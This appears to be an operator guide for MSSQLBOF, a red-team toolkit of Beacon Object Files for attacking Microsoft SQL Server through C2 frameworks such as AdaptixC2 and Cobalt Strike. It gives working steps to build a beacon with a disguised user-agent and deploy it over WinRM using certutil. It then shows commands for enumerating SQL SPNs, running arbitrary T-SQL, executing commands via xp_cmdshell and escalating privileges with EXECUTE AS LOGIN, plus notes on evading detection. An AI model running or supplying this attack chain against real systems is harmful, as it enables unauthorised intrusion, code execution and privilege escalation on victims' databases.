# MSSQLBOF — Operator end-to-end guide (lab validation)

This guide walks through deploying MSSQLBOF to a Windows lab via AdaptixC2
and running each BOF against a real SQL Server. Use it to validate your
build before any engagement.

## Prerequisites

1. **Built BOFs**: `make` produces `build/mssql_*.x64.o` and `.x86.o`
2. **Adaptix server + client running**, default profile (port 4321, password "pass")
3. **Lab Windows host** reachable on the network with WinRM enabled
4. **A Microsoft SQL Server** instance reachable from the Windows host
   (any version 2012+, Developer/Express/Standard/Enterprise)

## Step 1: Verify the BOFs cross-compile

```bash
cd /path/to/MSSQLBOF
make
ls build/mssql_*.x64.o
```

Expected output: 7 COFFs (`mssql_hello`, `mssql_find`, `mssql_info`,
`mssql_query`, `mssql_links`, `mssql_exec`, `mssql_impersonate`).

## Step 2: Create an Adaptix listener

In **AdaptixClient → Listeners → Create**:

| Field | Value |
|---|---|
| Name | `MSSQLBOF-HTTP` |
| Type | `BeaconHTTP` |
| Host & port (Bind) | `0.0.0.0` / `8443` |
| Callback addresses | `<your-server-ip>:8443` |
| Method | `POST` |
| URI | `/api/v1/data` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` |
| Heartbeat Header | `X-Beacon-Id` |
| SSL | unchecked |

Click **Create**. The listener should appear with status "Active".

## Step 3: Generate a beacon agent

In **AdaptixClient → Agents → Generate**:

| Field | Value |
|---|---|
| Listener | `MSSQLBOF-HTTP` |
| Agent | `beacon` |
| OS | `Windows` |
| Architecture | `x64` |
| Format | `Executable (EXE)` |
| Sleep | `5` |
| Jitter | `20` |

Click **Generate**. Save the resulting `.exe` to `/tmp/agent.exe`.

## Step 4: Deploy the agent to the lab Windows host

```bash
# From the operator box (where Adaptix runs)
WIN_HOST=192.168.0.122
WIN_USER=Administrator

# Push the agent EXE via WinRM (using pywinrm + base64 chunked upload)
python3 - <<PY
import base64, winrm, os
WIN_PASS = os.environ['WIN_PASS']  # set this
s = winrm.Session(f'http://${WIN_HOST}:5985/wsman', auth=(WIN_USER, WIN_PASS), transport='ntlm')
with open('/tmp/agent.exe', 'rb') as f:
    data = f.read()
b64 = base64.b64encode(data).decode()
# Upload in 4 KB chunks to stay under WinRM message size limits
for i in range(0, len(b64), 4096):
    chunk = b64[i:i+4096]
    op = '>' if i == 0 else '>>'
    s.run_ps(f'\$b="{chunk}"; [IO.File]::AppendAllText("C:\\\\Windows\\\\Temp\\\\agent.b64",\$b)')
s.run_ps('certutil -decode C:\\\\Windows\\\\Temp\\\\agent.b64 C:\\\\Windows\\\\Temp\\\\agent.exe; Start-Process C:\\\\Windows\\\\Temp\\\\agent.exe')
PY
```

A new beacon should appear in AdaptixClient within ~10 seconds.

## Step 5: Run the BOFs

In the agent's interactive console in AdaptixClient, use the standard
Beacon command `inline-execute`:

### `mssql_find` — LDAP enum (no SQL needed)

```
inline-execute /path/to/build/mssql_find.x64.o go
```

Expected output: a table of all `MSSQLSvc` SPNs in the current AD domain.

### `mssql_info` — connect to a SQL host and show version + sysadmin

```
inline-execute /path/to/build/mssql_info.x64.o go SQL01
```

Replace `SQL01` with the hostname or IP of a real SQL Server reachable
from the beacon. Expected output:

```
Server         : SQL01
Version        : 15.0.4460.4 (Express Edition (64-bit))
Clustered      : no
Current user   : SILENTSTRIKE\Administrator
Is sysadmin    : YES
Original login : SILENTSTRIKE\Administrator
Current DB     : master
xp_cmdshell    : disabled
Banner         : Microsoft SQL Server 2019 ...
```

### `mssql_query` — arbitrary T-SQL

```
inline-execute /path/to/build/mssql_query.x64.o go SQL01 "SELECT name FROM sys.databases"
inline-execute /path/to/build/mssql_query.x64.o go SQL01 --json "SELECT @@SERVERNAME"
```

### `mssql_links` — linked-server enum

```
inline-execute /path/to/build/mssql_links.x64.o go SQL01
```

If no linked servers configured, output is `(no linked servers)`.

### `mssql_exec` — code execution via xp_cmdshell

```
inline-execute /path/to/build/mssql_exec.x64.o go SQL01 "whoami"
```

Auto-enables `xp_cmdshell`, runs the command, captures stdout, restores
the prior `xp_cmdshell` config. Expected output: the SQL service account
identity (often `nt service\mssqlserver` or a configured AD account).

### `mssql_impersonate` — SQL privesc via EXECUTE AS LOGIN

```
inline-execute /path/to/build/mssql_impersonate.x64.o go SQL01 --discover
inline-execute /path/to/build/mssql_impersonate.x64.o go SQL01 sa "SELECT IS_SRVROLEMEMBER('sysadmin')"
```

## Step 6: Verify cross-C2 portability (optional)

The same `.x64.o` files work in any C2 framework that exposes a Beacon
API. To test:

- **Cobalt Strike**: load `aggressor/mssqlbof.cna` via Script Manager
- **Havoc**: use the `inline-execute` command in the agent console
- **Sliver**: `execute-assembly` won't work (it's for .NET) — use the
  Beacon Object File loader: `coff-loader -e go mssql_find.x64.o`
- **Metasploit**: `execute_bof mssql_find.x64.o go`
- **PoshC2**: use the `bof` command

If a single BOF works in all C2s, the cross-C2 claim is verified for
that BOF. The protocol layer is identical, so once one works the rest
will follow.

## Troubleshooting

**`connect failed (-1)`**: TCP connection refused. SQL Server is not
listening on the target port, or firewall is blocking, or hostname does
not resolve.

**`connect failed (-2): Schannel handshake failed`**: TLS handshake
failed. Check that the SQL Server allows TLS 1.2. Schannel cert
validation is off by default (self-signed certs accepted).

**`connect failed (-3): InitializeSecurityContextW failed`**: Kerberos /
NTLM authentication failed. Possibilities:
- The current beacon thread token has no AD identity → `make_token` first
- The MSSQLSvc SPN doesn't exist in AD → SQL Server admin must register it
- The beacon process token can't reach the DC → check AD reachability

**`SQL Error 18456`**: SQL Server rejected the login. The current user
exists but doesn't have permission. Check `sys.server_principals` on the
target.

**`SQL Error 297` on `mssql_exec`**: The current login is not sysadmin.
xp_cmdshell needs sysadmin. Use `mssql_impersonate` to escalate first.

## OPSEC reminder

Read [`OPSEC.md`](OPSEC.md) before running these on a real engagement.
The TL;DR:
- `mssql_find` — invisible
- `mssql_info`/`query`/`links` — only visible if SQL audit is on
- `mssql_exec` — **loud**: `sp_configure` events in default trace + `cmd.exe` child of `sqlservr.exe` in EDR process tree
- `mssql_impersonate` — `EXECUTE AS LOGIN` audit events 33205 + 33206
